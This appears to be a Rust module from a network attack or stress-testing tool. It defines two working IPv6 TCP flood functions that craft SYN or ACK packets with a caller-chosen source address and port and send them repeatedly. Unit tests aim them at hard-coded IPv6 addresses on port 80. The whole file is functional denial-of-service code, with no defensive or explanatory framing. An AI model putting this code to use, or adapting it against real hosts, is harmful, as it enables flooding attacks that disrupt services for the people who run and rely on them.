use anyhow::Result;
use pnet::packet::tcp::{ipv6_checksum, MutableTcpPacket, TcpFlags};
use rand::Rng;
use std::net::Ipv6Addr;

use crate::utils::return_layer4_tcp6_channel;
use crate::utils::TCP_BUFF_SIZE;
use crate::utils::TCP_DATA_LEN;
use crate::utils::TCP_HEADER_LEN;

pub fn send_syn_flood_packet(
    src_ipv6: Ipv6Addr,
    src_port: u16,
    dst_ipv6: Ipv6Addr,
    dst_port: u16,
    max_same_packet: usize,
) -> Result<()> {
    let (mut tcp_tx, _) = return_layer4_tcp6_channel(TCP_BUFF_SIZE)?;

    // tcp header
    let mut rng = rand::thread_rng();
    let mut tcp_buff = [0u8; TCP_HEADER_LEN + TCP_DATA_LEN];
    let mut tcp_header = MutableTcpPacket::new(&mut tcp_buff[..]).unwrap();
    tcp_header.set_source(src_port);
    tcp_header.set_destination(dst_port);
    tcp_header.set_sequence(rng.gen());
    tcp_header.set_acknowledgement(rng.gen());
    tcp_header.set_reserved(0);
    tcp_header.set_flags(TcpFlags::SYN);
    tcp_header.set_urgent_ptr(0);
    tcp_header.set_window(1024);
    tcp_header.set_data_offset(5);
    let checksum = ipv6_checksum(&tcp_header.to_immutable(), &src_ipv6, &dst_ipv6);
    tcp_header.set_checksum(checksum);

    for _ in 0..max_same_packet {
        match tcp_tx.send_to(&tcp_header, dst_ipv6.into()) {
            _ => (),
        }
    }
    Ok(())
}

pub fn send_ack_flood_packet(
    src_ipv6: Ipv6Addr,
    src_port: u16,
    dst_ipv6: Ipv6Addr,
    dst_port: u16,
    max_same_packet: usize,
) -> Result<()> {
    let (mut tcp_tx, _) = return_layer4_tcp6_channel(TCP_BUFF_SIZE)?;

    // tcp header
    let mut rng = rand::thread_rng();
    let mut tcp_buff = [0u8; TCP_HEADER_LEN + TCP_DATA_LEN];
    let mut tcp_header = MutableTcpPacket::new(&mut tcp_buff[..]).unwrap();
    tcp_header.set_source(src_port);
    tcp_header.set_destination(dst_port);
    tcp_header.set_sequence(rng.gen());
    tcp_header.set_acknowledgement(rng.gen());
    tcp_header.set_reserved(0);
    tcp_header.set_flags(TcpFlags::ACK);
    tcp_header.set_urgent_ptr(0);
    tcp_header.set_window(1024);
    tcp_header.set_data_offset(5);
    let checksum = ipv6_checksum(&tcp_header.to_immutable(), &src_ipv6, &dst_ipv6);
    tcp_header.set_checksum(checksum);

    for _ in 0..max_same_packet {
        match tcp_tx.send_to(&tcp_header, dst_ipv6.into()) {
            _ => (),
        }
    }
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;
    #[test]
    fn test_syn_flood_packet() {
        // 240e:34c:8b:25b0:17c1:ac6c:9baa:ade
        let src_ipv6 = Ipv6Addr::new(0x240e, 0x34c, 0x8b, 0x25b0, 0x17c1, 0xac6c, 0x9baa, 0xade);
        // 240e:34c:8b:25b0:20c:29ff:fe0c:237e
        let dst_ipv6 = Ipv6Addr::new(0x240e, 0x34c, 0x8b, 0x25b0, 0x20c, 0x29ff, 0xfe0c, 0x237e);
        let ret = send_syn_flood_packet(src_ipv6, 8888, dst_ipv6, 80, 1).unwrap();
        println!("{:?}", ret);
    }
    #[test]
    fn test_ack_flood_packet() {
        // 240e:34c:8b:25b0:17c1:ac6c:9baa:ade
        let src_ipv6 = Ipv6Addr::new(0x240e, 0x34c, 0x8b, 0x25b0, 0x17c1, 0xac6c, 0x9baa, 0xade);
        // 240e:34c:8b:25b0:20c:29ff:fe0c:237e
        let dst_ipv6 = Ipv6Addr::new(0x240e, 0x34c, 0x8b, 0x25b0, 0x20c, 0x29ff, 0xfe0c, 0x237e);
        let ret = send_ack_flood_packet(src_ipv6, 8888, dst_ipv6, 80, 1).unwrap();
        println!("{:?}", ret);
    }
}
